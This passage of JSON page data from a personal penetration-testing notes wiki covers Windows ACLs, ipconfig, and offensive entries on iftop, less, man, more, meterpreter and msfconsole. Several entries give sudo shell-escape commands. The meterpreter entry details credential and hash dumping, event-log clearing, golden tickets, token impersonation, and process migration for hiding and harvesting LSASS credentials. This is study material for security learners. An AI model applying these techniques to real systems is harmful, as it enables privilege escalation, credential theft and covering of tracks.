subdirectories)&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;(WD)&lt;/code&gt; — write data and add files&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;Note that the Windows File Explorer only displays the &lt;em&gt;first&lt;/em&gt; ACL for a particular user or group, but that Windows allows &lt;em&gt;multiple&lt;/em&gt; ACLs to be applied! This means that the File Explorer does not always show you the &lt;em&gt;actual&lt;/em&gt; permissions a user/group will have — you really do need to use icacls or Get-Acl.&lt;/p&gt;\n&lt;p&gt;In the case of multiple ACLs, or when a user is part of two groups with different groups, keep in mind that allow permissions only override &lt;em&gt;inherited&lt;/em&gt; deny permissions. Explicitly set deny permissions &lt;em&gt;cannot&lt;/em&gt; be overridden.&lt;/p&gt;"},"spells/iftop":{"slug":"spells/iftop","filePath":"spells/iftop.md","title":"iftop","links":["spells/sudo"],"tags":["Application/iftop","Application/sudo","AttackCycle/PrivEsc"],"content":"If iftop can be run with NOPASSWD via sudo, then you can break out into a root shell using !/bin/sh.","richContent":"&lt;p&gt;If iftop can be &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/sudo&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/sudo&quot;&gt;run with NOPASSWD via sudo&lt;/a&gt;, then you can break out into a root shell using &lt;code&gt;!/bin/sh&lt;/code&gt;.&lt;/p&gt;"},"spells/ipconfig":{"slug":"spells/ipconfig","filePath":"spells/ipconfig.md","title":"ipconfig","links":[],"tags":["OS/Windows","Application/ipconfig"],"content":"You can think of ipconfig on Windows as like the old ifconfig command on *NIX, but really ipconfig does a lot more.\nDisplay the current DNS settings:\nipconfig /displaydns | more\nFlush the local DNS cache:\nipconfig /flushdns","richContent":"&lt;p&gt;You can think of ipconfig on Windows as like the old ifconfig command on *NIX, but really ipconfig does &lt;em&gt;a lot&lt;/em&gt; more.&lt;/p&gt;\n&lt;p&gt;Display the current DNS settings:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;ipconfig &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;displaydns &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;|&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; more&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Flush the local DNS cache:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;ipconfig &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;flushdns&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/less":{"slug":"spells/less","filePath":"spells/less.md","title":"less","links":["spells/sudo"],"tags":["Application/less","Application/sudo","AttackCycle/PrivEsc"],"content":"If less can be run with NOPASSWD via sudo, then getting shell is as simple as !/bin/sh.","richContent":"&lt;p&gt;If less can be &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/sudo&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/sudo&quot;&gt;run with NOPASSWD via sudo&lt;/a&gt;, then getting shell is as simple as &lt;code&gt;!/bin/sh&lt;/code&gt;.&lt;/p&gt;"},"spells/man":{"slug":"spells/man","filePath":"spells/man.md","title":"man","links":["spells/sudo"],"tags":["Application/man","Application/sudo","AttackCycle/PrivEsc"],"content":"If man can be run with NOPASSWD via sudo, then you can break out into a root shell using !/bin/sh.","richContent":"&lt;p&gt;If man can be &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/sudo&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/sudo&quot;&gt;run with NOPASSWD via sudo&lt;/a&gt;, then you can break out into a root shell using &lt;code&gt;!/bin/sh&lt;/code&gt;.&lt;/p&gt;"},"spells/meterpreter":{"slug":"spells/meterpreter","filePath":"spells/meterpreter.md","title":"meterpreter","links":["spells/msfconsole","spells/Windows-event-logs","spells/NTLM-hashes","spells/Mimikatz","spells/Call-Mimikatz-from-a-meterpreter-shell"],"tags":["Application/Metasploit/meterpreter","AttackCycle/Exploitation","AttackCycle/Reconnaissance","AttackCycle/AntiForensics","Cryptography/Hashes/NT","OS/Windows/SAM","AttackCycle/PrivEsc/GoldenTickets","Application/Mimikatz","OS/Windows/EventLog","Application/PowerShell","AttackCycle/PrivEsc","OS/Windows/LSASS"],"content":"The meterpreter reverse shell requires a connection back to msfconsole using multi/handler.\nCommands\n\nbackground — background the current session and return to the Metasploit console\nclearenv — clears the (Windows) event logs (kinda obvious)\ncreds_all — dump all user credentials in memory (requires the kiwi module)\ndownload — transfer a file from the target to the attacker\nedit — edit a file\ngetpid — get current process ID\ngetprivs — display current user privileges\ngetsystem — attempt to elevate to SYSTEM/root\ngetuid — get current process user\ngolden_ticket_create — create a golden ticket (requires the kiwi module)\nguid — get session ID\nhashdump — dump NLTM hashes from the SAM (Windows-only, requires system privileges); fields are username, RID (the last four digits of the Windows SID, with leading zeros dropped), LM password hash, NTLM password hash\nifconfig — display host network interface information\ninfo — get information about a meterpreter extension\nload — load meterpreter extension\nload kiwi — load Mimikatz extension\nmigrate — migrate meterpreter to another process\nnetstat — display host network connections\nportfwd — forward a port on the host\nroute — mess with the host routing tables\nrun — run a meterpreter extension\nsearch — search for files\nsessions — switch to another (Metasploit) session\nshell — drop to system shell (return to meterpreter using CTRL + Z)\nsysinfo — pull remote system information\nupload — transfer a file from the attacker to the target\n\nmeterpreter sessions can be backgrounded using the background command, and all sessions can be backgrounded using CTRL + Z. List sessions using the sessions command, and foreground a session using session -i #, where # is the session number.\nThe sessions command is also used to connect to meterpreter sessions that have been caught after a successfully executed exploit.\nExtensions\nLoading PowerShell\nload powershell\npowershell_shell\nDon’t try to exit PowerShell — trying to do this produces consistent hangs for me. Instead, background the process with ^Z.\nUsing Mimikatz\nTransclude of Call-Mimikatz-from-a-meterpreter-shell\nUser impersonation\nload incognito\nlist_tokens -u\nimpersonate_token $DOMAIN\\\\$USER\nNot 100% sure where the “tokens” come from here… Mimikatz, maybe?\nProcess migration\nI think that meterpreter is being run directly from memory, and what migrate is doing is basically creating a new process using the memory of a different application, hopping to that process, and then shutting down the old process.\nReasons to migrate the meterpreter process:\n\nFor persistence (pick a long-running process)\nTo make sure that the meterpreter process has system privileges\nTo hide (pick a process less likely to be examined)\nTo stabilize the shell (initial exploits often produce somewhat unstable sessions)\nTo move laterally or escalate privileges within a system (if you’re lucky)\nTo gain additional capabilities\n\nIn particular, harvesting credentials from LSASS requires that meterpreter be living in a process with the same permissions (NT AUTHORITY/SYSTEM) and architecture as LSASS; migrating meterpreter can help us realize this. The print spooler service (spoolsv.exe) is often a good choice, as it runs with elevated permissions, has the same architecture as the system itself, and will restart itself automatically. You can also use lsass.exe directly if you feel like living dangerously.\nAnother example is that dumping keystrokes will only work when meterpreter is attached to a word processor or text editor.\nNote that meterpreter will happily let you migrate from a privileged to an unprivileged process — which may cause you to loose control of the target system! Additionally, migrating meterpreter will change its current working directory to that of the process it’s attaching to.\nExecuting run post/windows/manage/migrate will cause meterpreter to try to migrate to another process in an automated fashion. I’m not sure how “smart” this is in practice.","richContent":"&lt;p&gt;The meterpreter reverse shell &lt;em&gt;requires&lt;/em&gt; a connection back to &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/msfconsole&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/msfconsole&quot;&gt;msfconsole&lt;/a&gt; using multi/handler.&lt;/p&gt;\n&lt;h2 id=&quot;commands&quot;&gt;Commands&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#commands&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;code&gt;background&lt;/code&gt; — background the current session and return to the &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/msfconsole&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/msfconsole&quot;&gt;Metasploit console&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;clearenv&lt;/code&gt; — clears the (Windows) &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Windows-event-logs&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Windows-event-logs&quot;&gt;event logs&lt;/a&gt; (kinda obvious)&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;creds_all&lt;/code&gt; — dump all user credentials in memory (requires the &lt;code&gt;kiwi&lt;/code&gt; module)&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;download&lt;/code&gt; — transfer a file from the target to the attacker&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;edit&lt;/code&gt; — edit a file&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;getpid&lt;/code&gt; — get current process ID&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;getprivs&lt;/code&gt; — display current user privileges&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;getsystem&lt;/code&gt; — attempt to elevate to SYSTEM/root&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;getuid&lt;/code&gt; — get current process user&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;golden_ticket_create&lt;/code&gt; — create a golden ticket (requires the &lt;code&gt;kiwi&lt;/code&gt; module)&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;guid&lt;/code&gt; — get session ID&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;hashdump&lt;/code&gt; — dump &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/NTLM-hashes&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/NTLM-hashes&quot;&gt;NLTM hashes&lt;/a&gt; from the SAM (Windows-only, requires system privileges); fields are username, RID (the last four digits of the Windows SID, with leading zeros dropped), LM password hash, NTLM password hash&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;ifconfig&lt;/code&gt; — display host network interface information&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;info&lt;/code&gt; — get information about a meterpreter extension&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;load&lt;/code&gt; — load meterpreter extension&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;load kiwi&lt;/code&gt; — load &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Mimikatz&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Mimikatz&quot;&gt;Mimikatz&lt;/a&gt; extension&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;migrate&lt;/code&gt; — migrate meterpreter to another process&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;netstat&lt;/code&gt; — display host network connections&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;portfwd&lt;/code&gt; — forward a port on the host&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;route&lt;/code&gt; — mess with the host routing tables&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;run&lt;/code&gt; — run a meterpreter extension&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;search&lt;/code&gt; — search for files&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;sessions&lt;/code&gt; — switch to another (Metasploit) session&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;shell&lt;/code&gt; — drop to system shell (return to meterpreter using &lt;code&gt;CTRL + Z&lt;/code&gt;)&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;sysinfo&lt;/code&gt; — pull remote system information&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;upload&lt;/code&gt; — transfer a file from the attacker to the target&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;meterpreter sessions can be backgrounded using the &lt;code&gt;background&lt;/code&gt; command, and all sessions can be backgrounded using &lt;code&gt;CTRL + Z&lt;/code&gt;. List sessions using the &lt;code&gt;sessions&lt;/code&gt; command, and foreground a session using &lt;code&gt;session -i #&lt;/code&gt;, where &lt;code&gt;#&lt;/code&gt; is the session number.&lt;/p&gt;\n&lt;p&gt;The &lt;code&gt;sessions&lt;/code&gt; command is also used to connect to meterpreter sessions that have been caught after a successfully executed exploit.&lt;/p&gt;\n&lt;h2 id=&quot;extensions&quot;&gt;Extensions&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#extensions&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;h3 id=&quot;loading-powershell&quot;&gt;Loading PowerShell&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#loading-powershell&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;meterpreter&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;meterpreter&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;load powershell&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;powershell_shell&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;&lt;em&gt;Don’t&lt;/em&gt; try to exit PowerShell — trying to do this produces consistent hangs for me. Instead, background the process with &lt;code&gt;^Z&lt;/code&gt;.&lt;/p&gt;\n&lt;h3 id=&quot;using-mimikatz&quot;&gt;Using Mimikatz&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#using-mimikatz&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;&lt;/p&gt;&lt;blockquote class=&quot;transclude&quot; data-url=&quot;Call-Mimikatz-from-a-meterpreter-shell&quot; data-block=&quot;&quot; data-embed-alias=&quot;Call Mimikatz from a meterpreter shell&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Call-Mimikatz-from-a-meterpreter-shell&quot; class=&quot;transclude-inner internal alias&quot; data-slug=&quot;spells/Call-Mimikatz-from-a-meterpreter-shell&quot;&gt;Transclude of Call-Mimikatz-from-a-meterpreter-shell&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h3 id=&quot;user-impersonation&quot;&gt;User impersonation&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#user-impersonation&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;meterpreter&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;meterpreter&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;load incognito&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;list_tokens -u&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;impersonate_token $DOMAIN\\\\$USER&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Not 100% sure where the “tokens” come from here… &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Call-Mimikatz-from-a-meterpreter-shell&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Call-Mimikatz-from-a-meterpreter-shell&quot;&gt;Mimikatz&lt;/a&gt;, maybe?&lt;/p&gt;\n&lt;h2 id=&quot;process-migration&quot;&gt;Process migration&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#process-migration&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;I &lt;em&gt;think&lt;/em&gt; that meterpreter is being run directly from memory, and &lt;a href=&quot;https://security.stackexchange.com/questions/90578/how-does-process-migration-work-in-meterpreter/92893#92893&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;what &lt;code&gt;migrate&lt;/code&gt; is doing&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; is basically creating a new process using the memory of a different application, hopping to that process, and then shutting down the old process.&lt;/p&gt;\n&lt;p&gt;Reasons to migrate the meterpreter process:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;For &lt;a href=&quot;https://www.hackingarticles.in/multiple-ways-to-persistence-on-windows-10-with-metasploit/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;persistence&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; (pick a long-running process)&lt;/li&gt;\n&lt;li&gt;To make sure that the meterpreter &lt;em&gt;process&lt;/em&gt; has system privileges&lt;/li&gt;\n&lt;li&gt;To hide (pick a process less likely to be examined)&lt;/li&gt;\n&lt;li&gt;To stabilize the shell (initial exploits often produce somewhat unstable sessions)&lt;/li&gt;\n&lt;li&gt;To move laterally or escalate privileges within a system (if you’re lucky)&lt;/li&gt;\n&lt;li&gt;To gain additional capabilities&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;In particular, harvesting credentials from LSASS requires that meterpreter be living in a process with the same permissions (NT AUTHORITY/SYSTEM) and architecture as LSASS; migrating meterpreter can help us realize this. The print spooler service (spoolsv.exe) is often a good choice, as it runs with elevated permissions, has the same architecture as the system itself, and will restart itself automatically. You can also use lsass.exe directly if you feel like living dangerously.&lt;/p&gt;\n&lt;p&gt;Another example is that dumping keystrokes will only work when meterpreter is attached to a word processor or text editor.&lt;/p&gt;\n&lt;p&gt;Note that meterpreter will happily let you migrate from a privileged to an unprivileged process — which may cause you to loose control of the target system! Additionally, migrating meterpreter will change its current working directory to that of the process it’s attaching to.&lt;/p&gt;\n&lt;p&gt;Executing &lt;code&gt;run post/windows/manage/migrate&lt;/code&gt; will cause meterpreter to try to migrate to another process in an automated fashion. I’m not sure how “smart” this is in practice.&lt;/p&gt;"},"spells/more":{"slug":"spells/more","filePath":"spells/more.md","title":"more","links":["spells/cat","spells/ViM","spells/sudo"],"tags":["Application/more","Application/cat","Application/sudo","AttackCycle/PrivEsc","AttackCycle/Exploitation"],"content":"\n\n                  \n                  Tip\n                  \n                \n\n\nThe more command acts like cat whenever it can. The only way to force more into interactive mode is to make your terminal smaller than the number of lines in the file being displayed.\nIncidentally, this means that it’s impossible to send commands to more when using it to display a one-line file.\n\n\n\nAn editor can be invoked from more using v; by default this tries to invoke $VISUAL, and then $EDITOR, and then just Vi before giving up.\nIf more can be run with NOPASSWD via sudo, then an admin shell can be achieved by using ! to invoke a command (!/bin/bash, etc.). Note, however, that this is just executing $SHELL -c $COMMAND, which can fail if $SHELL is set to something exotic in /etc/passwd.\n\n\n                  \n                  Important\n                  \n                \n\n\nExotic shells in /etc/passwd can also cause commands executed via ssh to fail for the same reason.\n\n\n","richContent":"&lt;blockquote class=&quot;callout tip&quot; data-callout=&quot;tip&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Tip&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;The more command acts like &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/cat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/cat&quot;&gt;cat&lt;/a&gt; whenever it can. The only way to force more into interactive mode is to make your terminal smaller than the number of lines in the file being displayed.&lt;/p&gt;\n&lt;p&gt;Incidentally, this means that it’s impossible to send commands to more when using it to display a one-line file.&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;p&gt;An editor can be invoked from more using &lt;code&gt;v&lt;/code&gt;; by default this tries to invoke &lt;code&gt;$VISUAL&lt;/code&gt;, and then &lt;code&gt;$EDITOR&lt;/code&gt;, and then just &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/ViM&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/ViM&quot;&gt;Vi&lt;/a&gt; before giving up.&lt;/p&gt;\n&lt;p&gt;If more can be &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/sudo&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/sudo&quot;&gt;run with NOPASSWD via sudo&lt;/a&gt;, then an admin shell can be achieved by using &lt;code&gt;!&lt;/code&gt; to invoke a command (&lt;code&gt;!/bin/bash&lt;/code&gt;, etc.). Note, however, that this is just executing &lt;code&gt;$SHELL -c $COMMAND&lt;/code&gt;, which can fail if &lt;code&gt;$SHELL&lt;/code&gt; is set to something exotic in /etc/passwd.&lt;/p&gt;\n&lt;blockquote class=&quot;callout important&quot; data-callout=&quot;important&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Important&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;&lt;a href=&quot;https://stackoverflow.com/a/52673010&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Exotic shells in /etc/passwd can also cause commands executed via ssh to fail&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; for the same reason.&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;"},"spells/msfconsole":{"slug":"spells/msfconsole","filePath":"spells/msfconsole.md","title":"msfconsole","links":["spells/Nmap","spells/meterpreter","spells/SSH","spells/TCP","spells/UDP","spells/HTTP","spells/SMTP","spells/MySQL","spells/msfvenom","spells/John-the-Ripper","spells/Hashcat","spells/NTLM-hashes","spells/Metasploit-MS-SQL-modules"],"tags":["Application/Metasploit/msfconsole","AttackCycle/CommandAndControl","AttackCycle/AntiForensics","AttackCycle/Exploitation","Application/SSH","Application/Nmap","Protocol/TCP","Protocol/UDP","Protocol/HTTP","Protocol/SMB","Protocol/SMTP","Application/MySQL","AttackCycle/Exploitation/BruteForcing","Cryptography/Hashes/NT","Application/Metasploit/msfvenom","Application/Metasploit/meterpreter","Application/PsExec","OS/Windows","Application/JohnTheRipper","Protocol/RDP","AttackCycle/LateralMovement","Application/proxychains","Protocol/SOCKS"],"content":"Basic Metasploit flow:\n\nuse $MODULE_NAME\nset $OPTIONS\nrun\n\nYou can use msfconsole as a shell, but there’s no redirect functionality.\nCommands\n\nback — exit the current module\ndb_nmap $FLAGS $IP — run Nmap and dump the results into the Metasploit DB; all Nmap $FLAGS are supported and Metasploit will elevate privileges if necessary\nhelp — get Metasploit help\nhistory — display command history\nhosts — display known hosts in DB\nhosts -d — delete saved hosts from DB\ninfo — show module information (including exploit target options)\njobs — check the status of background jobs\noptions (advanced) — show module/exploit options (or “advanced” options)\nrun/exploit — run the selected exploit\nrun -j — run the selected exploit as a background job\nsearch — search modules; query to a particular type of module using the type: parameter (e.g., search type:exploit wordpress)\nservices — display services discovered in known hosts in DB\nsessions — list open meterpreter sessions on a box\nsessions -i $SESSION_NUMER — connect to meterpreter session $SESSION_NUMBER\nshow auxiliary — show auxiliary modules, filtered by relevancy if called from within a module\nshow exploits — show exploit modules\nshow options — show module options\nshow payloads — show payload modules, filtered by relevancy if called from within a module\nspool — save all console output to a log file (useful for 